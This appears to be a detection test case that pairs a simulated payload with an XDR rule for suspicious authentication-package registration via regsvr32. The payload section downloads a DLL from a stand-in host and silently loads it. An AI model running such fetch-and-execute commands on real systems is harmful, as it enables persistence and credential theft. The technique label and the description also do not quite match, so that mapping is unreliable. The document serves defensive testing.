identity.description: An attacker registers a malicious authentication package using regsvr32 to load a DLL, which is detected by Cortex analytics as suspicious authentication package registration. This behavior is used to maintain persistence and enable credential theft.

techniques.name: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

payload.code:
mkdir C:\temp
wget https://example.com/malicious.dll -O C:\temp\malicious.dll
regsvr32 /s C:\temp\malicious.dll

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Suspicious Authentication Package Registration
biocs.description: Detection of a process registering an authentication package via regsvr32
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'regsvr32.exe'
| filter action_command_line contains 'C:\\temp\\malicious.dll'
